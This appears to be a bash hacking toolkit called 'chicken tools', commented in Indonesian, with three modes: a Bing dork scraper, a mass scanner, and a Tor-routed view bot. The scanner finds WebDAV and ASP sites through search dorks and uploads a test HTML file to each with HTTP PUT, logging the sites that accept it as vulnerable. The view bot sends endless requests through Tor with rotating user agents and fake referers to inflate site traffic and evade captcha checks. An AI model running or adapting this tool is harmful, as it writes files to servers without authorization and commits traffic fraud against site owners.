#!/bin/bash

# This time I use Indonesian if you can't use Indonesian please translate to english

# informasi tentang alat ini
#-----------------------------#
# author : Polygon            #
# bahasa : bash               #
# alat   : chicken tools      #
###############################
#  nama para contributions    #
#                             #
# - polygon65                 #
###############################

# jika anda punya sesuatu maka anda bisa melakukan tarik permintaan
# dan mencantumkan nama kalian ke tabel contribusi di atas


# plugins bash moderen

. lib/moduler.sh

# yg di butuhkan
Bash.import: util/IO.FUNC util/IO.SYSTEM.var util/IO.TYPE
Bash.import: text_display/colorama text_display/IO.ECHO
Bash.import: fake_useragent/HTTP.UA util/IO.SYSTEM.log
Bash.import: util/IO.SYSTEM.var urlib/urlparser

# warna (colors)
bi=$(mode.bold: biru)    cy=$(mode.bold: cyan)
ij=$(mode.bold: hijau)  hi=$(mode.normal: hitam)
me=$(mode.bold: merah)  un=$(mode.bold: ungu)
ku=$(mode.bold: kuning) pu=$(mode.bold: putih)
m=$(mode.bold: pink)    st=$(default.color)

# untuk menyesuaikan layar saat di perbesar maupun di perkecil
shopt -s checkwinsize
stty sane

# depencies
var::array: array_depencies = { curl lynx ncurses-utils toilet tor }
for depencies in "${array_depencies[@]}"; do
	command -v $depencies >/dev/null 2>&1 || {
		apt-get install $depencies -y >/dev/null 2>&1 || {
		print_err " network not found (tolong cek internet anda)"
		exit 32
		}
	}
done

# variable dork nya	
var dork_1 : 'intitle:"Directory Listing For /" + inurl:webdav'
var dork_2 : 'intitle:”index.of” intext:”(Win32) DAV/2″ intext:”Apache” site:com'
var dork_3 : "inurl:.ah.cn/*.asp"
var dork_4 : "inurl:.it/*.asp"
var dork_5 : "inurl:.uk/*.asp"
var dork_6 : "inurl:.ac.cn/*.asp"

@ mesin pencari dork nya menggunakan lynx

def: machine(){
	global: cari = "$1"
	var COUNT : 0
	while [ "$COUNT" -le 225 ]; do
		lynx "http://www.bing.com/search?q=${cari}&qs=n&pq=${cari}&sc=8-5&sp=-1&sk=&first=$COUNT&FORM=PORE" -dump -listonly >> asp.tmp
		COUNT=$((COUNT +12))
	done
}

# untuk membersihkan hasil dari output mesin pencari dork nya

def: cleaner(){
	var files : "$1"
	# biasanya hasil dork dari lynx mesti harus di parse agar bisa di scan
	cat "$files" | \
            grep -v 'http://www.bing.com' | \
            grep -v 'javascript:void' | \
            grep -v 'javascript:' | \
            grep -v 'Hidden links:' | \
            grep -v 'Visible links' | \
            grep -v 'References' | \
            grep -v 'msn.com' | \
            grep -v 'microsoft.com' | \
            grep -v 'yahoo.com' | \
            grep -v 'live.com' | \
            grep -v 'microsofttranslator.com' | \
            grep -v 'irongeek.com' | \
            grep -v 'hackforums.net' | \
            grep -v 'freelancer.com' | \
            grep -v 'facebook.com' | \
            grep -v 'mozilla.org' | \
            grep -v 'stackoverflow.com' | \
            grep -v 'php.net' | \
            grep -v 'wikipedia.org' | \
            grep -v 'amazon.com' | \
            grep -v '4shared.com' | \
            grep -v 'wordpress.org' | \
            grep -v 'about.com' | \
            grep -v 'phpbuilder.com' | \
            grep -v 'phpnuke.org' | \
            grep -v 'youtube.com' | \
            grep -v 'p4kurd.com' | \
            grep -v 'tizag.com' | \
            grep -v 'devshed.com' | \
            grep -v 'owasp.org' | \
            grep -v 'fictionbook.org' | \
            grep -v 'silenthacker.do.am' | \
            grep -v 'codingforums.com' | \
            grep -v 'tudosobrehacker.com' | \
            grep -v 'zymic.com' | \
            grep -v 'gaza-hacker.com' | \
            grep -v 'immortaltechnique.co.uk' | \
            cut -d' ' -f4 | \
            sed -f modules/urldecode.sed | \
            sed '/^$/d' | \
            sed 's/9.//' | \
            sed '/^$/d' | \
            sort | \
            uniq
}

# fungsi scan untuk menscan vuln dari hasil dork

def: scan(){
	global: scan = "$1"
	# fake user agent 
	ua=$(Bash::Ua.Random)

	# di gunakan untuk sample / kelinci percobaan nya
	
	Tulis.strN "
<html>
	<head>
		<title>test 1/1</title>
	<head>
<body>
	<p>testing 1/2</p>
</body>
	</html>
	" > asp.html
	# regex substitution untuk mengomptimalkan penyaringan dork
	regex_scan=$(echo "$scan" | urlparser% to hostname)
	regex_proto=$(echo "$scan" | urlparser% to protocol)
	main_subs=${regex_scan%%/}

	# nah yg di bawah ini di gunakan untuk menyaring hasil variable main_subs
	if test "$regex_scan" == "${main_subs}/"; then
		index="${regex_proto}://${regex_scan}"
	else
		index="${regex_proto}://${regex_scan}/"
	fi

	@ alat pengetest nya menggunakan curl
	
	get_response=$(curl --silent -L --header "User-Agent: $ua" --tcp-fastopen --ssl --request PUT --url "${index}asu.html" --upload-file asp.html)
	get_code=$(curl --silent -L --header "User-Agent: $ua" --ssl --tcp-fastopen --request PUT --url "${index}asu.html" --tcp-fastopen --upload-file asp.html -o /dev/null -w %{http_code})

	@ memvalidasi result 	
	if [[ ! -z "$get_response" ]]; then
		var a : 4
	else
		var a : 1
	fi
		if [[ $? == 0 ]]; then
			var b : 1
		else
			var b : 2
		fi
	if [[ $get_code == 200 ]]; then
		var c : 1
	else
		var c : 9
	fi

	# finish validasi
	let hasil=$a+$b+$c

	@ hasil akan di verifikasi untuk mengetahui target vuln atau tidak
	
	if ((hasil == 3)); then
	# di gunakan untuk menvalidasi sebuah hasil dari operator if di atas
		Tulis.strN "${ku}[${pu}$(date +%H:%M:%S)${ku}]${ku} [${ij}INFO${ij}]${un}->${pu} ${regex_proto}://${regex_scan} ${me}-${bi}>${ku} [${ij}VULN WEBDAV${ku}]${st}"
		Tulis.strN "${scan}" >> found_grab.txt
	else
		Tulis.strN "${ku}[${pu}$(date +%H:%M:%S)${ku}]${ku} [${ij}INFO${ij}]${un}->${pu} ${regex_proto}://${regex_scan} ${me}-${bi}>${ku} [${me}NOT${pu}-${me}VULN${ku}]${st}"
	fi
		
}

trap "check; tput rmcup; tput sgr0; tput cnorm; rm -rf asp.html asp.tmp; Tulis.strN 'EXIT'; exit" INT SIGINT

def: app_main(){

	# tput smcup untuk mengatur display
	
	tput smcup
	while [[ $REPLY != 0 ]]; do
		echo -ne "\e[46;5m\e[1;37m" # warna background nya
		clear
	cat <<- EOF
	╲╲┏━━┓╲╲
	╲━╋━━╋━╲	[ chicken tools v.3 ]
	╲╲┃◯◯┃╲╲
	╲┏╯┈◣┃╲╲	* author : polygon
	╲╰━┳┳╯╲╲	* github : Bayu12345677
	▔▔▔┗┗▔▔▔
	EOF
	echo
		echo
	echo

	Tulis.strN "1. dorking    2. dork webdav    3. bot viewers site\n"
		read -p ">> " switch

	@ mengatur posisi dan warna ke default

	tput cup 10 0
	echo -ne ${st}
	tput ed
	tput cup 11 0
	tput sgr0
	tput rmcup
	
	case ${switch} in
					(1)
	                    clear
				        sys.dork
					    break ;;
					(2)
				      clear
				      sys.grab
				      break ;;
				    (3)
				      clear; {
				      	sys.bot;
				      	break
				      }; ;;
				esac
	done
}

def: sys.dork(){
	# banner nya make toilet aja :)

	banner_var=$(toilet -f slant -F border "dorking tools")
	Tulis.strN "${ku}${banner_var}${st}"
	Tulis.strN "${cy}${bsnner}${st}"
	Tulis.strN "${me}-> ${pu}author : polygon"
	Tulis.strN "${me}-> ${pu}github : Bayu12345677"
	echo
		echo
	Tulis.str "${me}->${ku} masukan dork kalian ${me}:${st} "
	read dork

	# yg di atas pasti dah paham
	# yg di bawah ini di gunakan untuk memvalidasi apakah input kosong apa ga
	# opsi -z fungsi nya jika string bernilai 0 maka akan di anggap benar
	# nah itu saya pakai untuk memvalidasi input

	if [[ -z "$dork" ]]; then
		println_err " input tidak boleh kosong"
		exit 25
	fi

	@ fungsi untuk mencari dork nya lewat paket Lynx
	machine "$dork"

	# fungsi maupun perintah pasti akan mengembalikan niai nah nilai 0 ini adalah angka yg dimana fungsi maupun command berhssil di eksekusi
	if [[ ! $? == 0 ]]; then
		println_info " Lynx error apakah anda memasukan dork yg valid ?"
		echo
			exit 23
	fi; echo

	@ :) ketik man test di terminal kalian ntar skroll aja 
	if [[ ! -f asp.tmp ]]; then
		println_info " hm sepertinya asp.tmp tidak ada (mohon cek internet anda atau masukan dork yg valid)"
		exit 23
	fi; (

	var jum : 0

	@ di bawah ini di gunakan untuk membersihkan dork
	
	hasil_dork=$(echo $(cleaner asp.tmp))

	@ jika isi dari variable hasil_dork kosong / bernilai zero (0) maka akan mengeksekusi command di dalam block then
	if [[ -z "$hasil_dork" ]]; then
		println_info " apakah dork valid ?"
		exit 5
	fi;
		# jika validasi di atas berhasil di lewatkan maka akan memulai proses dork nya
		
		for ambil in $(echo "$hasil_dork"); do
			delay: 01s
			Tulis.strN "${me}->${pu} ${ambil}${st}"
			Tulis.strN "${ambil}" >> dork.txt
		done
	); echo; {
		println_info " dork telah selesai (found [$(cat dork.txt | wc -l)])"
	}; echo
}

# fungsi maintance

def: app_maintance(){

Tulis.strN "
${un}╔╦╗┌─┐┬┌┐┌┌┬┐┌─┐┌┐┌┌─┐┌─┐
║║║├─┤││││ │ ├─┤││││  ├┤
╩ ╩┴ ┴┴┘└┘ ┴ ┴ ┴┘└┘└─┘└─┘${ij}
---------------------------------
${ku}[${me}!${ku}]${pu} (make update and cd .) to update the current repository
${ku}[${me}!${ku}]${pu} current version : $(cat version.txt)

${ku}[${cy}*${ij}*${ku}]${pu} link for discussion : https://chat.whatsapp.com/GxUnM7xAJyU7A0YYcjpnL0
";
 {
	exit $?
 };
}

# alat dork webdav

def: sys.grab(){
	banner=$(toilet -f slant -F border "grab webdav")

	Tulis.strN "${cy}${banner}${st}"
	Tulis.strN "${me}->${pu} Author ${me}:${pu} polygon"
	Tulis.strN "${me}->${pu} github ${me}:${pu} Bayu12345677"
	echo
	Tulis.str "${me}--> ${pu}masukan dork ${me}:${st} "
	read main_get

	echo
	# nah yg d bawah ini fungsi untuk memvalidasi variable main_get
	if [[ -z "$main_get" ]]; then
		echo; println_info " auto dork telah menyala"; echo
		@ yg di bawah ini adalah loop nya untuk memproses auto target by dork jika variable main_get bernilai zero
		echo; {
			for mengdork in $(echo -e "${dork_1}\n${dork_2}\n${dork_3}\n${dork_4}\n${dork_5}\n${dork_6}"); do

			# fungsi operator di bawah ini berfungsi untuk mengecek kondisi internet sampai proses benar benar berhenti
			
				if ! (curl -sL google.com > /dev/null 2>&1); then
					Tulis.strN "${ku}[${cy}$(date +%H:%M:%S)${ku}]${b}-> ${ku}[${ij}INFO${ku}]${pu} internet not found ${ku}[${un}404${ku}]${st}"
				fi

				# ini untuk memulai proses dork sampai memvalidasi nya
				machine "$mengdork"
				app_get=$(cleaner asp.tmp)
				for web in $(echo -e "$app_get"); do
					if ! (curl -sL google.com > /dev/null 2>&1); then
						Tulis.strN "${ku}[${cy}$(date +%H:%M:%S)${ku}]${b}-> ${ku}[${ij}INFO${ku}]${pu} internet not found ${ku}[${un}404${ku}]${st}"
					fi; {
							scan "$web";
							if [[ -f "asp.tmp" ]]; then
								rm -rf asp.tmp
							fi
							if [[ -f "asp.html" ]]; then
								rm -rf asp.tmp
							fi
						};
				done
			done; echo
		};
	fi; {
		# mencari dork
		
		machine "$main_get";

		# membersihkan

		bersih=$(cleaner asp.tmp);

		# mengambil hasil variable bersih
		for app_bersih in $(echo -e "$bersih"); do
			scan "$app_bersih";
		done;
		echo;
			if [[ ! -f "found_grab.txt" ]]; then
				Tulis.strN "FOUND ${ij}0${st}";
			else
				Tulis.strN "FOUND ${ij}$(cat found_grab.txt | wc -l)${st}";
			fi
			echo
		}; if [[ -f "asp.html" ]]; then rm -rf asp.html; fi
};

# tor socks nya
def: __app__.torsocks(){
	global: config = "$1";

	{
		tor -f "$config";
	}; var tor_port : "9050"; var tor_addr : "127.0.0.1"
};

# buat ngecek tor nya masi berjalan apa ga kalo berjalan otomatis bakal di kill
def: check(){
	cek=$(ps | grep -o "tor")
	if [[ $cek == tor ]]; then
		killall tor &> /dev/null
	fi
};

# class bot nya
def: sys.bot(){
	function __banner__ {
			Tulis.strN "${ku}╭━━━━━━━${un}◢◤${ku}━━━━╮"
			Tulis.strN "${ku}┃┏┓┏━━┳${un}◢◤${ku}┳┓${pu}╱╱╱${ku}┃ ${m}╔╗ ╔═╗╔╦╗      ${m}╦  ╦╦╔═╗╦ ╦╔═╗"
			Tulis.strN "${ku}┃┃┣┫${pu}╱╱${un}◢◤${pu}╱╱${ku}┣━━━┃ ${m}╠╩╗║ ║ ║ ${ij}<${me}<${un}•${ij}>${me}> ${m}╚╗╔╝║║╣ ║║║╚═╗"
			Tulis.strN "${ku}┃┗┛┗━${un}◢◤${ku}┻┻┻┛${pu}╱╱╱${ku}┃ ${m}╚═╝╚═╝ ╩       ${m} ╚╝ ╩╚═╝╚╩╝╚═╝"
			Tulis.strN "${ku}╰━━━${un}◢◤${ku}━━━━━━━━╯${st}"
			Tulis.strN "${ku}---------------------------------------------"
			Tulis.strN "${cy}[${me}•${ij}•${cy}]${pu} version : 4.0"
			Tulis.strN "${cy}[${me}•${ij}•${cy}]${pu} level   : 1"
			Tulis.strN "${ku}---------------------------------------------"
			Tulis.strN "${me}(${ku}+${me})${pu} Author : Polygon (Bayu riski A.M)"
			Tulis.strN "${me}(${ku}+${me})${pu} github : https://github.com/Bayu12345677"
			Tulis.strN "${me}(${ku}+${me})${pu} donasi : 085731184377 (via : dana)"
			Tulis.strN "${ku}---------------------------------------------${st}"
	};
		function __view__.app {
			# variable nya
			global: site = "$1"; @ ni nama nya positional paramater akses nya make dolar terus kasi numeric 1 dan seterus nya
			global: addr = "$2"
			global: port = "$3"
			global: mode = "${4:-default}"; @ jika argument 4 kosong maka akan di gantikan oleh value default
			
			__ua__=$(Bash::Ua.Random); @ fake user agent nya bang
			# fungsi array di bawah ini untuk submit nya atau sumber masuk nya bot ke web jadi biar gak di kira fake user intinya buat submit doang
			var::array: __referer__ = { "\"http://google.ru\"" "\"http://www.beinyu.com\"" "\"http://google.com.tw\"" "\"http://google.gg\"" "\"http://google.by\"" "\"http://google.ca\"" "\"http://twitter.com\"" "\"http://google.com.sg\"" }
			@ yg di atas itu untuk fungsi req code nya yg di bawah ini untuk fungsi req utama nya sengaja w pisah biar gak di curigai ama capcha nya
			__methods__=(
						"http://google.tl"
						"http://facebook.com"
						"http://google.com.my"
						"http://google.cn"
						"http://youtube.com"
						"http://yahoo.com"
						"https://github.com"
						"https://www.google.com"
						)
			while true :; do
			random=$(shuf -i 1-${#__referer__[@]} -n 1); @ ini buat ngerandom array di atas opsi -n itu untu head atau kepala nya
			__random__=$(shuf -i 0-6 -n 1); @ sama kek tadi
				if ! (curl -s google.com > /dev/null 2>&1); then @ ni Fungsi nya buat ngecek internet secara realtime
					Tulis.str "\r${cy}[${me}•${ij}•${cy}]${pu} koneksi terputus${st}"
					Tulis.str "\r${cy}[${ij}•${me}•${cy}]${pu} menghubungkan kembali${st}"
				fi; {
					  # buat ngecek code dari hasil request ke site nya
					  __code__=$(curl --tr-encoding --socks5-hostname 127.0.0.1:9050 --tcp-fastopen --tcp-nodelay --ssl -s -L --header "user-agent: Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36" --referer "${__referer__[$random]}" --url "${site}" -o /dev/null -w %{http_code} --insecure --compressed)
					}; @ ni opsi yg argument 4 tadi
						if [[ ${mode} == debug ]]; then
							Tulis.str "\r${ku}[${ij}INFO${ku}]${pu} mode debug ${me}(${ij}on${me})${st}"; echo
							curl -v --ssl --socks5-hostname 127.0.0.1:9050 -s -L -A "${__ua__}" --tcp-fastopen --tcp-nodelay --referer "${__referer__[$random]}"--url "${site}" -o /dev/null
						elif [[ ${mode} == default ]]; then
							__ua__2=$(Bash::Ua.Random); @ user agent
							Tulis.str "\r${ku}[${me}•${ij}•${ku}]${pu} mode default"; echo
								ip=$(curl --tr-encoding --socks5-hostname 127.0.0.1:9050 -s -L -A "${__ua__2}" --tcp-fastopen --tcp-nodelay --referer "${__methods__[$__random__]}"-s -L --url "https://ipsaya.com" | grep -Eo '<br>  [^"].*' | sed 's;<br>(;\n;g' | head -1 | sed 's;<br>  ;'';g')
								Tulis.strN "${cy}[${me}•${ij}•${cy}]${pu} Site    ${me}:${pu} ${site}"
								Tulis.strN "${cy}[${me}•${ij}•${cy}]${pu} addr    ${me}:${pu} ${ip}"
								Tulis.strN "${cy}[${me}•${ij}•${cy}]${pu} proxy   ${me}:${pu} 9050"
								Tulis.strN "${cy}[${me}•${ij}•${cy}]${pu} code    ${me}:${pu} ${__code__}${st}"
								Tulis.strN "${cy}[${me}•${ij}•${cy}]${pu} referer ${me}:${pu} ${__methods__[$__random__]}${st}"
								echo
						fi; done
		}; clear
		# banner nya
		__banner__; echo
		Tulis.str "${ku}(${cy}•${me}•${ku})${pu} masukan site nya ${me}: ${st}"
		read site

		# opsi -z -> jika operator mempunyai value atau nilai berjumlah zero -> 0 maka akan di anggap benar
		if [[ -z "$site" ]]; then
			echo
			println_info " input gak boleh kosong"
			println_info " input not found"
			echo
			exit 2
		fi; {
				echo; @ memulai tor socks nya
				println_info " memulai torsocks"
				__app__.torsocks "tor.conf" 2> /dev/null 1>/dev/null &
				delay: 20s; @ saya kasi delay 20 detik untuk memastikan tor sudah menyala
				if [[ $? == 0 ]]; then @ mengenali dari pengembalian nilai
					println_info " tosocks telah aktive"
				else
					println_info " tosocks error"
					println_info " sepertinya config tidak valid"
					println_info " (warning) : dilarang mengubah config tor"
					println_info " (warning) : harus memakai termux jika anda memakai terminal lain sesuaikan path di config dengan terminal anda"
					exit 2
				fi; echo; @ mulai bot nya
				println_info " memulai bot"; echo
				__view__.app "${site}" "${tor_addr}" "${tor_port}" "default"
			}
}; {
	# untuk fitur maintance nya	
	var::command version = "curl -sL https://raw.githubusercontent.com/Bayu12345677/chicken_tools/main/files/version.txt"

	if [[ "$(cat files/version.txt)" == "$version" ]]; then
		dumy=
	else
		{
			app_maintance;
		};
	fi;
		var::command this = IO.func; (:); { $this.NAME app_main; } && { command eval app_main; } || { true; }
}

